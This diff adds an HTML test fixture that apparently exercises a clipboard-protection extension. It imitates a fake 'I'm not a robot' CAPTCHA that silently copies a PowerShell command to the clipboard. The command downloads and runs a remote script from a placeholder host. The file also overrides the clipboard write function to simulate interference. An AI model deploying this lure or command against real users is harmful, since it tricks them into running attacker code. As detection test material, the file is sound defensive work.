@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Verify you are human</title>
+    <script>
+      // Stands in for another extension or the page wrapping writeText after us without ever calling the original.
+      Clipboard.prototype.writeText = function () {
+        document.title = 'swallowed';
+        return Promise.resolve();
+      };
+    </script>
+  </head>
+  <body>
+    <h2>Verify you are human</h2>
+    <label><input type="checkbox" id="cb" /> I'm not a robot</label>
+    <script>
+      document.getElementById('cb').addEventListener('click', () => {
+        navigator.clipboard.writeText('powershell -w h -c "iwr https://x.example.invalid/a.ps1 | iex"');
+      });
+    </script>
+  </body>
+</html>
